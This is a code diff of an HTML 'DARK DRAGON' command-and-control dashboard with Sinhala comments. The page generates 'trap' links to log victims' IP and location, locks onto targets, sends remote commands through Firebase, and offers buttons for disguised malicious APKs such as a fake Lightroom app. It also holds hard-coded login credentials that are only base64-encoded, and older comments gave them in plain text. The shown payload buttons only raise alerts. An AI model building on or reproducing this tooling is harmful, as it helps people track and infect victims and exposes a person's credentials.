@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v4.5 [STABLE]</title>
+    <title>DARK DRAGON | ULTIMATE SYSTEM v2.0 [STABLE]</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -64,7 +64,7 @@
 </div>
 
 <div id="dashboard">
-    <header><h3>DRAGON REMOTE COMMAND INTERFACE v4.5</h3></header>
+    <header><h3>DRAGON REMOTE COMMAND INTERFACE v4.6</h3></header>
     <div class="target-status">
         <span>🛰️ LOCKED: <b id="active-target-display" style="color:var(--cyan)">NONE</b></span>
         <button id="deselect-btn" style="display:none; margin-left:15px;" onclick="deselectTarget()">DESELECT</button>
@@ -109,13 +109,13 @@
             <div class="card">
                 <h3>🐈 CAT TRAP (LINK)</h3>
                 <input type="text" id="trap-name" placeholder="Target Name" style="width:90%">
-                <button class="btn-cyan" onclick="generateTrap()">GENERATE LINK</button>
-                <p id="link-display" style="font-size:10px; color:var(--cyan); margin-top:10px; word-break:break-all;"></p>
+                <button class="btn-cyan" onclick="generateTrap()">GENERATE SECURE LINK</button>
+                <p id="link-display" style="font-size:10px; color:var(--cyan); margin-top:10px; word-break:break-all; padding:5px; background:rgba(0,0,0,0.5);"></p>
             </div>
             <div class="card">
                 <h3>📦 PAYLOADS (APK)</h3>
-                <button class="btn-special" style="width:100%; margin-bottom:5px;">STEALTH PAYLOAD v1</button>
-                <button class="btn-special" style="width:100%;">WHATSAPP CLONE APK</button>
+                <button class="btn-special" style="width:100%; margin-bottom:5px;" onclick="alert('Infecting Lightroom Pro Payload...')">📸 LIGHTROOM PRO APK</button>
+                <button class="btn-special" style="width:100%;" onclick="alert('Stealth Payload v1 Ready')">💀 STEALTH PAYLOAD v1</button>
             </div>
             <div class="card" style="grid-column: 1 / -1;">
                 <h3>📊 WEB TRAP LOGS (IP/LOC)</h3>
@@ -169,14 +169,12 @@
 </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
     const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // --- AUTH KEYS (BTOA Encrypted) ---
-    const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ=="; // kaviakiya@gmail.com
-    const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA=="; // Akindu@Dewshan20241118
+    const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ=="; 
+    const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA=="; 
 
     function checkAccess() {
         if(btoa(document.getElementById('admin-email').value) === _0x4d1a && btoa(document.getElementById('admin-password').value) === _0x2b5s) {
@@ -237,12 +235,20 @@
         logActivity(`Sent: ${cmd}`);
     }
 
+    // --- 404 FIX LOGIC FOR GITHUB PAGES ---
     function generateTrap() {
         const name = document.getElementById('trap-name').value;
         if(!name) return alert("Name Required!");
-        const link = window.location.origin + "/trap.html?id=" + btoa(name);
-        document.getElementById('link-display').innerText = link;
-        logActivity(`Link Created for ${name}`);
+        
+        // GitHub Pages වලට ගැලපෙන විදිහට path එක නිවැරදිව හදනවා
+        let baseUrl = window.location.href.split('?')[0].split('#')[0];
+        let baseDir = baseUrl.substring(0, baseUrl.lastIndexOf('/'));
+        
+        // අන්තිමට trap.html අනිවාර්යයෙන්ම එකතු කරනවා
+        const finalLink = baseDir + "/trap.html?id=" + btoa(name);
+        
+        document.getElementById('link-display').innerText = finalLink;
+        logActivity(`Trap Link Generated: ${name}`);
     }
 
     function logActivity(msg) {
@@ -257,7 +263,6 @@
         evt.currentTarget.classList.add('active');
     }
 
-    // Matrix Background
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
